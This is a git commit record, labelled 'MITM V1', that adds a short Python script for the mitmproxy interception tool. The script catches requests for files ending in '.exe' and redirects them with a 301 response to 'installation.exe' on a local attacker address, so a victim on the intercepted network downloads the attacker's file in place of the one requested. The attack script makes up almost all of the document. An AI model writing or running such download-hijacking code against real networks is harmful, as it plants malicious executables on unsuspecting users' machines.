05a2a70c54fc643efd6d8a4ba86501debb523e8d
Wenly0 <abbaszada10@gmail.com>
2023-07-22 15:44:31 +0400

    MITM V1

---
+++ mitm v1.py
@@ -0,0 +1,10 @@
+import mitmproxy
+
+def request(flow):
+	if flow.request.host != "10.0.2.15" and flow.request.pretty_url.endswith(".exe"):
+		flow.response = mitmproxy.http.Response.make(301, "", {"Location" : "http://10.0.2.15/installation.exe"})
+		
+
+#def response(flow):
+#	print("response....")
+#	print(flow)
